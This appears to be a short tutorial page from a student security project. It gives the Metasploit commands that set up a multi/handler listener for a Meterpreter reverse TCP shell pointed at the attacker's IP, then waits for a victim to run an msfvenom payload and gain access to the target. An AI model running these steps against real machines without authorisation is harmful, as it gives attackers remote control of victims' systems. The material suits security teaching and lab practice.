# Using Meterpreter

In msfconsole, type **use exploit/multi/handler**, this will handle exploits launched outside of the framework, such as the payload we created using msfvenom.

Set the payload to meterpreter reverse shell **set payload windows/meterpreter/reverse_tcp**.

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/multihandler.png" width="600">

---
Set the lhost to the attacker's ip **set lhost [attacker ip]**.

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/options.png" width="600">

---
Run the payload by typing **run**.

<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/run.png" width="600">

---
Now wait for the target to execute the payload created using msfvenom, once it is executed, it should look something like this.

---
<img src="https://raw.githubusercontent.com/yukun2h4ng/1600final/yukun2h4ng-patch-1/images/connected.png" width="600">

Now meterpreter is enabled and we have access to the target system.

---
